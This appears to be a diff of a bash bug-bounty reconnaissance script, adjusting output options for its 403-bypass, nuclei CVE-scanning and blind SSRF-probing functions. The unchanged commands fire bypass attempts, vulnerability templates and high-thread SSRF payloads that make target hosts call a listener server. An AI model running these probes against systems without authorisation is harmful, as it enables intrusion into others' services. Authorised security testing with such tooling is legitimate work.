@@ -295,7 +295,7 @@ bypass403test(){
   echo "[bypass403] Try bypass 4xx..."
   if [ -s $TARGETDIR/403-all-subdomain-live-scheme.txt ]; then
     # xargs -n1 -I {} bypass-403 "{}" "" < "$TARGETDIR/403-all-subdomain-live-scheme.txt"
-    interlace --silent -tL "$TARGETDIR/403-all-subdomain-live-scheme.txt" -threads 50 -c "bypass-403 _target_ ''" | grep -E "\[2[0-9]{2}\]" > $TARGETDIR/403-bypass-output.txt
+    interlace --silent -tL "$TARGETDIR/403-all-subdomain-live-scheme.txt" -threads 50 -c "bypass-403 _target_ ''" | grep -E "\[2[0-9]{2}\]" | tee $TARGETDIR/403-bypass-output.txt
   fi
   echo "[bypass403] done."
 }
@@ -355,7 +355,7 @@ nucleitest(){
     # use -c for maximum templates processed in parallel
     nuclei -silent -l $TARGETDIR/3-all-subdomain-live-scheme.txt -t $HOMEDIR/nuclei-templates/technologies/ -o $TARGETDIR/nuclei/nuclei_output_technology.txt
     echo "[nuclei] CVE testing..."
-    nuclei -v -trace-log $TARGETDIR/nuclei/nucleilog -o $TARGETDIR/nuclei/nuclei_output.txt \
+    nuclei -silent -o $TARGETDIR/nuclei/nuclei_output.txt \
                     -l $TARGETDIR/3-all-subdomain-live-scheme.txt \
                     -t $HOMEDIR/nuclei-templates/vulnerabilities/ \
                     -t $HOMEDIR/nuclei-templates/cves/2014/ \
@@ -457,7 +457,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[SSRF-2] Blind probe..."
-    xargs -n1 -I {} ffuf -v -r -c -t 550 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -n1 -I {} ffuf -r -c -t 550 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
